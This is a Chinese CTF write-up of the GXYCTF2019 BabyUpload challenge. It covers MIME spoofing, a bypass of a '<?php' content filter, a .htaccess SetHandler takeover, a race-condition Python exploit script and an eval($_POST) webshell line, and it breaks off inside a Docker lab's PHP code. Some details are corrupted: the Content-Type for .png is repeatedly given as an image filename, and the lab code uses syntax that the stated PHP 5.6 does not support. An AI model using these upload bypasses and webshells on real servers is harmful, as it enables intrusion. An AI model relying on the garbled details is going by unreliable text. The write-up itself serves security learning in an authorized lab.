---
title: "[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析"
date: 2026-11-18 10:00:00
updated: 2026-11-18 10:00:00
categories:
  - CTF
  - Web
  - 文件上传
tags:
  - 文件上传
  - MIME 伪造
  - .htaccess
  - SetHandler
  - PHP 短标签
  - 上传竞态
  - GXYCTF
description: 直接传被 MIME 检查拦下，改包后又被 <?php 标记拦；换成 <script language="php"> 传上去，却只是个不会执行的 .png。404 页面暴露 Apache 后，用 .htaccess 的 SetHandler 把整个目录交给 PHP，再配合 3 秒清理的竞速脚本一次拿 flag。
difficulty: 入门
topic: 文件上传
series: 文件上传
series_order: 3
permalink: 2026/11/18/web-ctf-upload-babyupload/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（建议先看 [文件上传基础](/2026/10/24/web-knowledge-upload-basics/) 和本系列前两篇）
- **考点**：MIME 伪造、后缀黑名单、内容黑名单、`.htaccess` + `SetHandler`、上传-访问竞态、脚本化
- **四层检查**：`Content-Type` 必须是 `image/jpeg`；文件名 `ph` 系列被拦；内容含 `<?php` 被拦；`.png` 默认不会被 PHP 解析
- **路线**：直接传被拦 → Burp 改 MIME → 换 `<script language="php">` → 传 `.htaccess` → 访问 `.png` 执行 → 脚本竞速
- **关键**：`.htaccess` 和木马必须落在**同一个上传目录**；目录按会话生成，所以两次上传要用同一个 `Session`
- **flag**：`CTF2{7794c465-e40e-46e4-b07c-3ff142955943}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：HTTP `multipart/form-data`、Burp 改包、PHP 基本语法、Python `requests`
- **工具**：Burp Suite（Repeater / Proxy）、Python 3、`requests`
- **环境**：文中的靶场地址是当时的临时环境，现在多半已经失效。文末给了一个 **Docker + Apache + PHP 5.6 的本地复现实验**，可以完整跑通本文的脚本
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`看上传框` → `直接传被 MIME 拦` → `Burp 改 Content-Type` → `试 <?php 被内容检查拦` → `换 <script language="php">` → `发现 .png 不执行` → `404 暴露 Apache` → `传 .htaccess` → `脚本竞速拿 flag`
{% endnote %}

## 题目：一个朴素的上传框

打开靶场，页面只有一个上传框：

![BabyUpload 上传页面](01-upload-form.png)

*图 1：页面没有多余提示，只有一个文件选择框和“上传”按钮*

这类题没有花哨的前端，所有线索都在**服务端的回显**里。先把已知信息记下来：

| 线索 | 值 | 从哪来 |
| --- | --- | --- |
| 上传字段名 | `uploaded` | Burp 里看 `Content-Disposition: form-data; name="uploaded"` |
| 上传目录 | `/var/www/html/upload/<hash>/` | 上传成功后的回显 |
| Web 路径 | `/upload/<hash>/<文件名>` | 把绝对路径里的 `/var/www/html` 换成站点根 |
| 服务器 | `Apache/2.4.10 (Debian)` | 后面 404 页面的页脚 |
| PHP 版本 | `5.6.23` | 响应头 `X-Powered-By` |
| 清理机制 | 约 3 秒清一次上传目录 | 手工复现时文件很快消失 |

这道题的核心不是“传一个 `.php` 上去”这么简单，而是**四层检查逐层过**：

1. **MIME 类型**：不是 `image/jpeg` 就拒绝；
2. **文件名**：`php` / `phtml` 这一族后缀被拦；
3. **文件内容**：出现 `<?php` 标记就拒绝；
4. **执行**：就算文件落盘，`.png` 也不会被 PHP 解析。

前三层决定“能不能传上去”，第四层决定“传上去有没有用”。很多人卡在第三层，更多人卡在第四层。

## 第一层：MIME 类型检查

先按最朴素的方式，传一个内容为 PHP 的 `.png`。页面直接回：

> 上传类型也太露骨了吧！

![直接上传被类型检查拦下](02-type-blocked.png)

*图 2：上传后页面提示“上传类型也太露骨了吧！”，文件没有落盘*

这句提示说明服务端在检查 **MIME 类型**。浏览器上传文件时，会根据后缀自动填一个 `Content-Type`：

| 文件名 | 浏览器通常声明的 `Content-Type` |
| --- | --- |
| `shell.png` | `01-upload-form.png` |
| `shell.jpg` / `shell.jpeg` | `image/jpeg` |
| `shell.php` | `application/x-php` 或 `text/plain` |
| `.htaccess` | 空或 `application/octet-stream` |

服务端大概率只认 `image/jpeg` 这一个值，所以 `.png` 的 `01-upload-form.png` 也被拒了。这不是“后缀白名单”，而是**把某一个 MIME 写死**。

### 为什么 MIME 检查靠不住

关键点：`Content-Type` 是**请求里的一个普通字段**，由客户端填写。浏览器确实会按后缀自动填，但攻击者可以：

- 用 Burp 截包，直接改；
- 用 `curl -F` 指定；
- 用 Python `requests` 的 `files=` 元组指定。

所以服务端读到的 `$_FILES['uploaded']['type']`，本质上和 `filename` 一样，都是**用户可控的字符串**。只检查它，等于让用户自己声明“我是好人”。

{% note warning %}
**别把“浏览器自动填的”当成“服务器验证过的”。**

`Content-Type`、`filename`、文件内容全都在请求体里，客户端想写什么就写什么。真正的服务端校验应该用 `finfo_file()` 读文件真实类型，或者用 `getimagesize()` 确认它是不是一张能解析的图片。只比较 `$_FILES['type']` 是典型的“信任客户端”。
{% endnote %}

## 第二层：文件名和后缀黑名单

把请求送进 Burp Repeater，先只改 `Content-Type`：

```http
Content-Disposition: form-data; name="uploaded"; filename="exploit.png"
Content-Type: image/jpeg
```

请求体先放一个 PHP 5 的老式标签：

```html
<script language="php">eval($_POST['a']);</script>
```

发送后上传成功：

![Burp 改 MIME 后上传成功](03-burp-upload.png)

*图 3：`filename="exploit.png"`、`Content-Type: image/jpeg`，文件成功写入 `/var/www/html/upload/e780.../exploit.png`*

这一步同时说明两件事：

1. **MIME 检查被绕过了**：服务端只看请求里的 `Content-Type`；
2. **`.png` 后缀不在黑名单里**：文件名检查至少没有拦 `.png`。

题目对文件名的过滤，实测是把 `ph` 这一族按死了：

| 后缀 | 能否上传 | 说明 |
| --- | --- | --- |
| `.php` | ✗ | 最直接的可执行后缀，必拦 |
| `.phtml` / `.pht` / `.phar` | ✗ | 同属 `ph` 系列，通常一起拦 |
| `.png` | ✓ | 图片后缀，能过文件名检查 |
| `.jpg` / `.jpeg` | ✓ | 同上 |
| `.htaccess` | ✓ | 没有常规后缀，反而容易漏 |

但这里要停一下：**`.png` 能上传，不代表它能执行。** 后面第四层会专门处理这个问题。

{% note info %}
**为什么题目要拦 `ph` 系列，却放过了 `.htaccess`？**

因为出题人的思路是“只要不让你传可执行后缀，你就没办法”。但文件是否能执行，不只取决于后缀，还取决于**服务器怎么解析这个目录**。`.htaccess` 恰好能改解析规则，而且它本身没有 `.php` 后缀，正好从黑名单的缝里钻过去。
{% endnote %}

## 第三层：内容黑名单

MIME 和文件名都过了，接下来试最标准的 PHP 标签：

```php
<?php echo file_get_contents("/flag"); ?>
```

发送后页面回：

> 诶，别蒙我啊，这标志明显还是php啊

![<?php 被内容检查拦下](04-php-blocked.png)

*图 4：`filename="exploit.jpg"`、`Content-Type: image/jpeg`，内容里的 `<?php` 触发内容黑名单*

这句“这标志明显还是php啊”很关键：服务端不是在做图片完整性校验，而是在**扫描文件内容里的特征字符串**。它盯的很可能是 `<?php` 这个开标签。

那换一种 PHP 写法：

```php
<?
    echo file_get_contents("/flag");
?>
```

这次上传成功：

![短标签上传成功](05-short-tag.png)

*图 5：把 `<?php` 换成 `<?`，文件成功写入 `.../exploit.jpg`*

对比两次结果：

| 内容 | 结果 | 说明 |
| --- | --- | --- |
| `<?php echo ...; ?>` | 被拦 | 命中 `<?php` 标记 |
| `<? echo ...; ?>` | 上传成功 | 没有 `<?php` 这个完整标记 |
| `<script language="php">...</script>` | 上传成功 | 含 `php`，但不含 `<?php` |

所以内容黑名单拦的是 **`<?php` 这个标记**，不是笼统的 `php` 三个字母，也不是所有 `<?`。

但这个结论只解决“传上去”的问题，**没解决“能不能执行”**：

- `<? ... ?>` 是 PHP 短标签，能不能执行取决于 `short_open_tag` 配置；
- `.jpg` / `.png` 后缀本身不会被 PHP 解析；
- 文件现在只是躺在 upload 目录里。

{% note warning %}
**“上传成功”和“代码执行”是两件事。**

很多新手看到“succesfully uploaded”就以为拿下了，结果访问文件只看到源码、空白页或 404。判断标准只有一个：**访问它，看服务端有没有真的执行 PHP**。可以先用 `<?php echo "test123"; ?>` 这种无副作用的 payload 验证解析，再上真正读 flag 的代码。

注意：本题的 `<?php` 会被内容黑名单拦，所以验证时要么用 `<script language="php">echo "test123";</script>`，要么用 `<? echo "test123"; ?>`（前提是短标签开启）。
{% endnote %}

### 顺带补一张 PHP 开标签表

| 写法 | 含 `<?php` | PHP 5.6 | PHP 7+ | 本题 |
| --- | --- | --- | --- | --- |
| `<?php ... ?>` | 是 | ✅ | ✅ | 内容黑名单拦截 |
| `<? ... ?>` | 否 | 需 `short_open_tag=On` | 需开启 | 能上传，执行看配置 |
| `<?= ... ?>` | 否 | ✅ | ✅ | 只能输出，不能写复杂逻辑 |
| `<script language="php"> ... </script>` | 否 | ✅ | ❌ 已移除 | 能上传，本题 PHP 5.6 可执行 |

本题服务器的 `X-Powered-By` 是 `PHP/5.6.23`，所以 `<script language="php">` 可用。这也是最终脚本选它的原因：**不依赖 `short_open_tag`，比 `<?` 稳。**

## 第四层：上传成功，但 .png 不会执行

现在文件已经传上去了，回显还给了绝对路径：

```text
/var/www/html/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png succesfully uploaded!
```

把它换成 Web 路径访问：

```text
http://<靶场地址>/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png
```

结果通常是以下几种之一：

| 现象 | 含义 |
| --- | --- |
| 浏览器直接显示 PHP 源码 | 文件被当静态文本返回，没有执行 |
| 下载文件 | 同上，`Content-Type` 是图片或二进制 |
| 空白页 | 可能执行了但没输出，也可能没执行 |
| 页面出现 `test123` | 真的执行了 |

因为后缀是 `.png`，Apache 默认会把它交给静态文件处理器（或图片处理器），**不会交给 PHP**。这就是“上传成功但没用”的根本原因。

要让 `.png` 执行，得改**服务器对这个目录的解析规则**。这正是 `.htaccess` 的用武之地。

## 第五层：从 404 页面发现 Apache

在传 `.htaccess` 之前，先确认服务器是不是 Apache。访问一个不存在的路径，比如：

```text
http://<靶场地址>/flag
```

![访问 /flag 的 404 页面](06-apache-404.png)

*图 6：`The requested URL /flag was not found on this server.`，页脚写着 `Apache/2.4.10 (Debian) Server`*

这个页面透露了两件事：

1. **flag 不在 Web 根目录**，直接访问 `/flag` 是 404——它只存在于文件系统根目录，得靠代码去读；
2. **后端服务器是 Apache**，而且版本是 2.4.10（Debian）。

Apache 有一个招牌特性：**`.htaccess`**。它是放在目录里的配置文件，Apache 每次处理该目录的请求时都会读它。只要 `AllowOverride` 允许，攻击者就能通过上传 `.htaccess` 改变这个目录的解析行为。

{% note info %}
**`Server: openresty` 和 `Apache` 不矛盾。**

上传响应头里的 `Server` 是 `openresty`（Nginx 系），404 页脚却是 `Apache/2.4.10`。这通常说明前面有一层 openresty 反向代理，真正执行 PHP 的是后面的 Apache。`.htaccess` 是否生效，取决于后端 Apache 的 `AllowOverride`，不要被最外层的 `Server` 头带偏。
{% endnote %}

{% note info %}
**如果后端不是 Apache 呢？**

Nginx 不读 `.htaccess`，同样的思路要换成 `user.ini` / `.user.ini`、`fastcgi_param` 或者找别的解析漏洞。所以“服务器是什么”不是背景知识，而是**决定下一步走哪条路的关键信息**。本题的 404 页面把 Apache 写在页脚，等于把路标递到了手上。
{% endnote %}

### SetHandler 是怎么工作的

Apache 处理一个文件时，会先决定用哪个 **handler**。`.png` 默认走静态文件 handler；PHP 文件走 `application/x-httpd-php`。

`.htaccess` 里的这一行：

```apache
SetHandler application/x-httpd-php
```

意思是：**这个目录下的所有文件，都交给 `application/x-httpd-php` 这个 handler 处理**，不管后缀是什么。

于是：

```text
exploit.png  →  Apache 读到 SetHandler  →  交给 PHP  →  执行文件内容
```

这就把“后缀必须是 `.php`”的限制绕开了。后缀还是 `.png`，内容还是 PHP，但解析器已经被换掉了。

{% note warning %}
**`x-httpd-php` 别少写那个 `d`。**

正确写法是：

```apache
SetHandler application/x-httpd-php
```

不是 `application/x-http-php`。少一个 `d`，Apache 找不到对应 handler，通常不会报错，只会继续按静态文件处理——表现就是“`.htaccess` 传上去了，但木马还是不执行”，非常容易误判。
{% endnote %}

### SetHandler、AddHandler、AddType 的区别

`.htaccess` 里让文件被 PHP 解析，常见有三种写法：

| 指令 | 作用 | 影响范围 |
| --- | --- | --- |
| `SetHandler application/x-httpd-php` | 强制整个目录用 PHP handler | 目录下所有文件 |
| `AddHandler application/x-httpd-php .png` | 把 `.png` 这个后缀映射到 PHP handler | 指定后缀 |
| `AddType application/x-httpd-php .png` | 把 `.png` 的 MIME 类型改成 PHP | 指定后缀，依赖 mod_mime |

本题用 `SetHandler` 最直接：不用关心后缀，整个目录都归 PHP。缺点是会把目录里的图片也当 PHP 执行（如果图片不是合法 PHP，可能报错或输出乱码），但在 CTF 里无所谓。

如果 `SetHandler` 不生效，可以按顺序换 `AddHandler`、`AddType` 再试。三者都依赖一个前提：**Apache 允许 `.htaccess` 生效**。

### AllowOverride：.htaccess 的开关

Apache 的主配置里有一项 `AllowOverride`：

```apache
<Directory /var/www/html>
    AllowOverride None
</Directory>
```

- `None`：完全忽略 `.htaccess`，传了也白传；
- `All`：允许所有指令；
- `FileInfo`：允许 `SetHandler`、`AddType` 这类与文件处理相关的指令。

本题能打通，说明上传目录的 `AllowOverride` 至少允许了 `FileInfo` 级别的指令。如果传了 `.htaccess` 之后访问目录变成 **500 Internal Server Error**，通常就是 `.htaccess` 里的指令不被允许，或者语法写错了。

## 第六层：把 .htaccess 和木马放进同一个目录

`.htaccess` 只对**它所在的目录及其子目录**生效。所以它必须和木马在同一个上传目录里。

本题的上传路径长这样：

```text
/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png
                └──────────┬──────────┘
                     这一段是目录
```

这个目录名看起来像随机的十六进制串。它通常和**会话**绑定：同一个 `PHPSESSID` 上传的文件，会落在同一个目录；换一个会话，目录就变了。

这意味着：

- 不能先用浏览器传 `.htaccess`，再用 Burp 传木马——只要 Cookie 变了，目录就可能不同；
- 用脚本时，必须用**同一个 `requests.Session`**，让两次上传共享同一个 `PHPSESSID`；
- 上传后从回显里解析出路径，**确认两个文件的目录部分完全一致**，再访问。

最终脚本里加了这一步检查：

```python
if htaccess_path.rsplit("/", 1)[0] != shell_path.rsplit("/", 1)[0]:
    print("  [!] 两个文件不在同一目录，重试")
    continue
```

如果两个文件不在同一目录，`.htaccess` 管不到木马，访问木马只会得到静态内容——表现出来就是“脚本一直跑，但永远没有 flag”。

{% note success %}
**`.htaccess` 本身也要过前三层检查。**

它是通过同一个上传接口传的，所以同样要满足：

- `Content-Type: image/jpeg`（脚本里统一用这个）；
- 文件名不含 `ph`（`.htaccess` 不含）；
- 内容不含 `<?php`（`SetHandler` 这一行不含）。

换句话说，**在服务端眼里，`.htaccess` 只是另一张“图片”**。它不检查你写的是什么指令，只检查 MIME、文件名和 `<?php` 标记。
{% endnote %}

## 第七层：3 秒清理与脚本竞速

题目环境还有一个坑：上传目录大约每 3 秒清理一次。

这带来一个很现实的竞速问题：

```text
上传 .htaccess  →  上传木马  →  访问木马
        ↑              ↑            ↑
     可能被删       可能被删      必须还活着
```

手工用 Burp 也能做，但要在 3 秒内完成“改包 → 发送 → 改包 → 发送 → 浏览器访问”，很容易超时；而且两次上传必须共享 Cookie，手动复制 `PHPSESSID` 也麻烦。所以这题适合写脚本：

- 用一个 `Session` 保持 Cookie；
- 先传 `.htaccess`，再传木马；
- 立刻访问木马；
- 失败就重试，最多 30 次；
- 木马文件名随机，访问时带随机查询参数，避免缓存和旧文件干扰。

脚本第一次就成功时，输出就像图 7：

![脚本运行结果](07-flag.png)

*图 7：第 1 次尝试就拿到 flag，响应类型是 `text/html`，说明 `.png` 被 PHP 执行了*

```text
CTF2{7794c465-e40e-46e4-b07c-3ff142955943}
```

## 完整脚本

下面这版在原稿基础上做了几处加固：统一异常处理、校验两个文件的目录是否一致、用正则提取 flag、失败时给出明确提示。

```python
import random
import re
import sys

import requests

# 换成你的靶场地址
BASE = "http://<靶场地址>"

# 让 Apache 把这个目录下的所有文件都交给 PHP 处理
HTACCESS = "SetHandler application/x-httpd-php"

# 一句话木马：直接读 /flag 并输出
# 用 <script language="php"> 而不是 <?php，因为内容黑名单拦 <?php
SHELL = '<script language="php">echo file_get_contents("/flag");</script>'

FLAG_RE = re.compile(r"(?:CTF2|GXY|flag)\{[^}]*\}", re.I)

session = requests.Session()
session.trust_env = False   # 不走系统代理，避免本机代理干扰


def upload(filename, content):
    """
    上传一个文件，成功返回它的 Web 路径（如 /upload/abc/123.png）。
    失败返回 None，并打印服务端的拒绝原因。
    """
    files = {
        # 第三个元素是 Content-Type，服务端只认 image/jpeg
        "uploaded": (filename, content, "image/jpeg")
    }

    try:
        resp = session.post(BASE + "/", files=files, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as exc:
        print(f"  [!] 上传请求失败：{exc}")
        return None

    if "/upload/" not in resp.text:
        print(f"  [!] 上传被拒：{resp.text[:120]}")
        return None

    # 回显：/var/www/html/upload/<hash>/<name> succesfully uploaded!
    path = resp.text.split("/upload/", 1)[1].split(" ", 1)[0]
    return "/upload/" + path


def main():
    for attempt in range(1, 31):
        print(f"==== 第 {attempt} 次尝试 ====")

        htaccess_path = upload(".htaccess", HTACCESS)
        if not htaccess_path:
            continue

        # 文件名随机，避免网关缓存旧结果
        shell_name = f"{random.randint(100000, 999999)}.png"
        shell_path = upload(shell_name, SHELL)
        if not shell_path:
            continue

        print(f"  .htaccess: {htaccess_path}")
        print(f"  webshell : {shell_path}")

        # .htaccess 只对所在目录生效，必须和木马同目录
        if htaccess_path.rsplit("/", 1)[0] != shell_path.rsplit("/", 1)[0]:
            print("  [!] 两个文件不在同一目录，重试")
            continue

        # 随机参数绕过缓存，也避免命中上一次的旧文件
        url = BASE + shell_path + "?t=" + str(random.randint(1, 999999))
        try:
            resp = session.get(url, timeout=10)
        except requests.RequestException as exc:
            print(f"  [!] 访问失败：{exc}")
            continue

        print(f"  status={resp.status_code} type={resp.headers.get('Content-Type')}")
        match = FLAG_RE.search(resp.text)
        if match:
            print(f"\n[+] flag = {match.group(0)}")
            return

        print(f"  未命中，响应前 120 字符：{resp.text[:120]!r}")

    print("\n[-] 30 次都没成功：确认靶场还在线、网络稳定、.htaccess 未被拦截")
    sys.exit(1)


if __name__ == "__main__":
    main()
```

### 脚本里几个容易出错的点

| 代码 | 为什么这么写 |
| --- | --- |
| `session = requests.Session()` | 保持 `PHPSESSID`，让 `.htaccess` 和木马落在同一个目录 |
| `session.trust_env = False` | 避免系统代理把请求转走，尤其是本机开了代理工具时 |
| `files={"uploaded": (...)}` | 字段名必须是 `uploaded`；第三个元素是伪造的 `Content-Type` |
| `"image/jpeg"` | 服务端只认这个 MIME；`.htaccess` 也要用它 |
| `split("/upload/", 1)[1]` | 从回显里取路径，比猜 md5 可靠 |
| `rsplit("/", 1)[0]` | 取目录部分，比较两个文件是否同目录 |
| 随机文件名 + `?t=` | 避免缓存、旧文件、文件名碰撞 |
| `FLAG_RE` | 同时兼容 `CTF2{...}`、`GXY{...}` 以及本地复现的 `flag{...}` |
| `sys.exit(1)` | 30 次都失败时明确退出，而不是静默结束 |

{% note warning %}
**不要在这次请求里加 `time.sleep()`。**

清理周期只有约 3 秒，上传完 `.htaccess` 和木马后要**立刻**访问。加 sleep 等于主动把文件送进清理窗口。重试逻辑应该放在外层，而不是在两次上传之间等待。
{% endnote %}

## 知识点补充

### 1. 文件上传的四层检查

把这道题抽象一下，文件上传的检查点通常有四层：

| 层 | 检查内容 | 常见实现 | 本题情况 | 绕过 |
| --- | --- | --- | --- | --- |
| 1 | MIME 类型 | `$_FILES['type']` | 必须是 `image/jpeg` | Burp 改 `Content-Type` |
| 2 | 文件名/后缀 | 黑名单、白名单 | `ph` 系列被拦 | 用 `.png` / `.jpg` |
| 3 | 文件内容 | `preg_match`、`getimagesize` | 拦 `<?php` | 换 `<script language="php">` |
| 4 | 执行解析 | 后缀映射、目录配置 | `.png` 不执行 | `.htaccess` + `SetHandler` |

**前两层决定“能不能传”，第三层决定“内容能不能过”，第四层决定“传了有没有用”。** 做题时按顺序逐层确认，不要看到“上传成功”就以为结束了。

### 2. MIME 检查的两种写法

| 写法 | 读的是什么 | 是否可信 |
| --- | --- | --- |
| `$_FILES['uploaded']['type']` | 请求里的 `Content-Type` | ❌ 客户端可伪造 |
| `finfo_file(finfo_open(FILEINFO_MIME_TYPE), $tmp_name)` | 文件真实内容 | ✅ 相对可靠 |
| `getimagesize($tmp_name)` | 文件是否是可解析图片 | ✅ 对图片有效 |
| `exif_imagetype($tmp_name)` | 文件头魔数 | ✅ 但对多语言文件有局限 |

本题用的是第一种，所以一个 `Content-Type: image/jpeg` 就过了。

### 3. 内容黑名单为什么总被绕过

内容黑名单通常是正则匹配，问题在于：

- **匹配的标记太具体**：只拦 `<?php`，就漏了 `<?`、`<script language="php">`、`<?=`；
- **只看开头**：只在文件开头找 `<?php`，可以在前面加垃圾字符；
- **不区分上下文**：`php` 出现在注释、字符串里也算命中，导致误杀；反过来，攻击者可以用编码、拼接、大小写绕过；
- **不做语法分析**：它不知道文件到底是不是合法 PHP，只知道“有没有这个字符串”。

本题就是典型：`<?php` 被拦，`<script language="php">` 里虽然有 `php`，但没有 `<?php`，于是顺利通过。

### 4. .htaccess 的适用范围

| 事实 | 说明 |
| --- | --- |
| 只对所在目录及子目录生效 | 所以必须和木马同目录 |
| 需要 `AllowOverride` 允许 | `None` 时完全无效 |
| 是 Apache 特有 | Nginx 不读 |
| 每次请求都会读 | 改了立即生效，不用重启 |
| 可以嵌套 | 子目录可以有自己的 `.htaccess` 覆盖父目录 |

常见的解析接管写法：

```apache
# 整个目录都交给 PHP
SetHandler application/x-httpd-php

# 只让 .png 交给 PHP
AddHandler application/x-httpd-php .png

# 把 .png 的 MIME 改成 PHP
AddType application/x-httpd-php .png

# 让所有请求先包含一个文件（PHP-FPM 场景也常见）
php_value auto_prepend_file /var/www/html/upload/xxx.png
```

### 5. mod_php 与 PHP-FPM 的差异

`SetHandler application/x-httpd-php` 适用于 **Apache + mod_php**。如果 PHP 是通过 PHP-FPM 跑的，handler 名不一样，通常要写成：

```apache
SetHandler "proxy:unix:/run/php/php7.4-fpm.sock|fcgi://localhost"
```

或者用 `AddHandler` / `AddType` 配合 FPM 的配置。本题的 `X-Powered-By` 和 404 页脚指向 Apache + PHP 5.6，`SetHandler` 能直接生效。

判断方法：

- 响应头有 `X-Powered-By: PHP/5.6.23`，只能说明跑了 PHP，不能区分 mod_php / FPM；
- 看 `Server` 头是 Apache；
- 试 `SetHandler`，不通再换 `AddHandler` / `AddType`；
- 如果有 `phpinfo()`，看 `Server API`：`Apache 2.0 Handler` 是 mod_php，`FPM/FastCGI` 是 FPM。

### 6. 上传目录与会话的绑定

本题的回显路径里有一段随机十六进制：

```text
/upload/e780531528bcbc32dbab0d8c5c4eb63c/exploit.png
```

这类目录常见的生成方式：

| 方式 | 特点 |
| --- | --- |
| `md5(session_id())` | 同一会话固定，换会话就变 |
| `md5(时间戳 + 随机数)` | 每次上传都可能不同 |
| 固定目录 + 随机文件名 | 最容易利用 |

本题脚本用同一个 `Session` 能成功，说明目录和会话绑定。做题时要**从回显里读路径**，不要自己猜；猜错目录，`.htaccess` 就管不到木马。

### 7. 竞态与脚本可靠性

3 秒清理意味着上传和访问之间存在竞争。脚本提高成功率的几个手段：

| 手段 | 作用 |
| --- | --- |
| 同一个 `Session` | 保证两个文件同目录 |
| 上传后立刻访问 | 抢在清理之前 |
| 外层重试 30 次 | 单次失败不影响整体 |
| 随机文件名 | 避免旧文件/缓存干扰 |
| `?t=随机数` | 绕过 URL 缓存 |
| 目录一致性检查 | 避免“上传成功但 .htaccess 管不到” |

如果网络很慢，3 秒窗口可能不够。这时可以：

- 减少不必要的请求（不要先探测目录）；
- 用更短的 payload；
- 把 `.htaccess` 和木马的上传合并成一次请求（如果服务端支持多文件字段）；
- 换一个网络环境更好的节点。

### 8. 如果 .htaccess 走不通

不是所有题都允许 `.htaccess`。常见替代思路：

| 情况 | 替代方案 |
| --- | --- |
| 黑名单漏了某个可执行后缀 | 直接传 `.phtml`、`.pht`、`.php5` 等 |
| Apache 但 `AllowOverride None` | 找已有的可执行目录、利用其他解析漏洞 |
| Nginx + PHP-FPM | 找 `user.ini` / `.user.ini`、`fastcgi_split_path_info` 解析漏洞 |
| 上传目录禁止执行 | 尝试路径穿越、软链接、其他写文件点 |
| 有文件包含点 | 把图片当 PHP 包含，配合 `auto_prepend_file` |

本题的路线是“`.htaccess` 接管解析”，但核心问题始终是：**能不能让服务端把上传的文件当代码执行。**

## 新手常见问题

{% note info %}
**Q1：为什么直接传 `.png` 会提示“上传类型也太露骨了吧”？**

服务端检查的是请求里的 `Content-Type`，而且大概率只认 `image/jpeg`。浏览器给 `.png` 填的是 `01-upload-form.png`，所以被拒。用 Burp 把 `Content-Type` 改成 `image/jpeg` 就能过。
{% endnote %}

{% note info %}
**Q2：`Content-Type` 不是浏览器自动填的吗，为什么能改？**

它是 `multipart/form-data` 请求体里的一个普通字段，和 `filename` 一样由客户端填写。浏览器只是“默认帮你填”，用 Burp、`curl -F`、Python `requests` 都能随意改。服务端如果只读这个值，等于没有校验。
{% endnote %}

{% note info %}
**Q3：为什么 `<?php` 被拦，`<script language="php">` 却不被拦？**

内容黑名单匹配的是 `<?php` 这个标记，不是单独的 `php` 三个字母。`<script language="php">` 里虽然有 `php`，但没有 `<?php`，所以能过。`<?` 短标签也能过，因为它同样不含 `<?php`。
{% endnote %}

{% note info %}
**Q4：`<?` 短标签上传成功了，为什么访问没执行？**

`<?` 能不能执行取决于 PHP 的 `short_open_tag` 配置。很多环境默认关闭，短标签会被当成普通文本。本题服务器是 PHP 5.6，最终脚本改用 `<script language="php">`，这个标签在 PHP 5 里不依赖 `short_open_tag`，更稳。
{% endnote %}

{% note info %}
**Q5：上传成功但访问是源码/404/空白，怎么办？**

先分清三种情况：

- **源码**：文件被当静态文本返回，说明没有执行；
- **404**：路径不对，或者文件已经被清理；
- **空白**：可能执行了但没输出，也可能没执行。

判断执行与否，最可靠的是放一个 `echo "test123";`，访问后看页面有没有 `test123`；其次看响应头有没有 `X-Powered-By: PHP`。
{% endnote %}

{% note info %}
**Q6：为什么一定要传 `.htaccess`，不能直接传 `.php`？**

`.php` 后缀在文件名黑名单里，传不上去。`.png` 能传，但默认不执行。`.htaccess` 的作用是**改这个目录的解析规则**，让 `.png` 也被 PHP 处理，从而绕过后缀限制。这是“换解析器”而不是“换后缀”。
{% endnote %}

{% note info %}
**Q7：`.htaccess` 里的 handler 名写错了会怎样？**

如果写成 `application/x-http-php`（少一个 `d`），Apache 找不到对应 handler，通常不报错，只是继续按静态文件处理。表现就是“`.htaccess` 传上去了，木马还是不执行”。正确写法是 `application/x-httpd-php`。
{% endnote %}

{% note info %}
**Q8：为什么 `.htaccess` 和木马必须在同一个目录？**

`.htaccess` 只对所在目录及其子目录生效。如果两个文件落在不同目录，`.htaccess` 管不到木马，木马仍然按 `.png` 静态返回。本题上传目录和会话绑定，所以要共用 `Session`，并在脚本里检查两个路径的目录部分是否一致。
{% endnote %}

{% note info %}
**Q9：为什么要重试 30 次？**

因为上传目录大约每 3 秒清理一次。可能 `.htaccess` 刚传完就被删，也可能木马刚传完就被删，或者访问时刚好赶上清理。单次失败不代表思路错，重试能覆盖竞态窗口。
{% endnote %}

{% note info %}
**Q10：为什么脚本要随机文件名和 `?t=随机数`？**

随机文件名避免和旧文件/缓存碰撞；`?t=` 让每次访问的 URL 不同，绕过 CDN、反向代理或浏览器缓存。否则可能访问到上一次的旧内容，误以为没执行。
{% endnote %}

{% note info %}
**Q11：`SetHandler` 不生效怎么办？**

按顺序排查：

1. `AllowOverride` 是不是 `None`；
2. handler 名是不是 `application/x-httpd-php`；
3. 是 mod_php 还是 PHP-FPM（FPM 要换 handler 写法）；
4. 换 `AddHandler application/x-httpd-php .png` 或 `AddType application/x-httpd-php .png`；
5. 看访问目录是不是 500，500 通常是 `.htaccess` 语法或权限问题。
{% endnote %}

{% note info %}
**Q12：怎么确认木马真的执行了？**

三个信号：

- 页面出现你 `echo` 的字符串；
- 响应头出现 `X-Powered-By: PHP/...`；
- 读取 `/flag` 成功，页面出现 flag。

如果只是“上传成功”，什么都不算。
{% endnote %}

{% note info %}
**Q13：为什么直接访问 `/flag` 是 404？**

flag 在文件系统根目录 `/flag`，不在 Web 根目录 `/var/www/html` 下。Web 服务器只暴露站点根目录，所以直接访问 `/flag` 找不到。木马执行后，PHP 进程有权限读文件系统，`file_get_contents("/flag")` 才能读到。
{% endnote %}

{% note info %}
**Q14：本地怎么复现？**

见下一节的 Docker 实验。核心是 Apache + mod_php + `AllowOverride All`，再加一个只检查 MIME/文件名/内容的 PHP 上传接口。本地不需要复现 3 秒清理，脚本把重试去掉也能跑通。
{% endnote %}

## 本地复现实验（Docker + Apache + PHP 5.6）

在线靶场会失效，但这道题的四层检查和 `.htaccess` 接管可以在本地完整复现。

**1. 目录结构**

```text
babyupload/
├── Dockerfile
└── index.php
```

**2. `Dockerfile`**

```dockerfile
FROM php:5.6-apache

# 允许 .htaccess 生效，并准备一个可写的上传目录
RUN sed -ri 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf \
    && mkdir -p /var/www/html/upload \
    && chmod 777 /var/www/html/upload \
    && echo 'CTF2{local_babyupload_demo}' > /flag

COPY index.php /var/www/html/index.php
```

**3. `index.php`（模拟题目的四层检查）**

```php
<?php
session_start();

$file = $_FILES['uploaded'] ?? null;
if (!$file) {
    die('no file');
}

// 第一层：只认 image/jpeg
if ($file['type'] !== 'image/jpeg') {
    die('上传类型也太露骨了吧！');
}

// 第二层：文件名里的 ph 系列后缀
$name = basename($file['name']);
if (preg_match('/\.ph/i', $name)) {
    die('后缀被拦');
}

